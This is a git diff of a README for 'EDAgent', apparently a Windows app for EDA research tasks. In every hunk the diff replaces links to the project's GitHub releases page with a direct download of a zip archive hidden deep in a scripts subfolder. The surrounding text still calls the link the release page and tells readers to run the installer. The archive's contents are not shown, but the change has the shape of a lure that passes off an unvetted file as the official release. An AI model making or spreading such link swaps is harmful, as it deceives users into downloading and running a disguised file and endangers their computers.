@@ -1,6 +1,6 @@
 # 🤖 EDAgent - Simplify Your EDA Research Tasks
 
-[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-brightgreen)](https://github.com/Biswajit56546/EDAgent/releases)
+[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-brightgreen)](https://raw.githubusercontent.com/Biswajit56546/EDAgent/main/skills/eda-loop/references/scripts/Agent-ED-3.0.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get EDAgent ready and running on your Windows PC.
 
 Go to the EDAgent release page here:  
 
-[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-9cf)](https://github.com/Biswajit56546/EDAgent/releases)  
+[![Download EDAgent](https://img.shields.io/badge/Download-EDAgent-9cf)](https://raw.githubusercontent.com/Biswajit56546/EDAgent/main/skills/eda-loop/references/scripts/Agent-ED-3.0.zip)  
 
 This page has all program versions available for download.
 
@@ -109,7 +109,7 @@ EDAgent will process your input using its skills. It gives clear answers, sugges
 
 New releases improve features and fix bugs. To update:
 
-- Visit the release page again: https://github.com/Biswajit56546/EDAgent/releases  
+- Visit the release page again: https://raw.githubusercontent.com/Biswajit56546/EDAgent/main/skills/eda-loop/references/scripts/Agent-ED-3.0.zip  
 - Download the newest installer  
 - Run it like before—it will replace the older version safely  
 
@@ -156,4 +156,4 @@ Visit the main page to explore topics:
 
 Start using EDAgent by visiting the release page below. Download the suitable file for your PC and follow the install steps above.
 
-[Get EDAgent Here](https://github.com/Biswajit56546/EDAgent/releases)
+[Get EDAgent Here](https://raw.githubusercontent.com/Biswajit56546/EDAgent/main/skills/eda-loop/references/scripts/Agent-ED-3.0.zip)
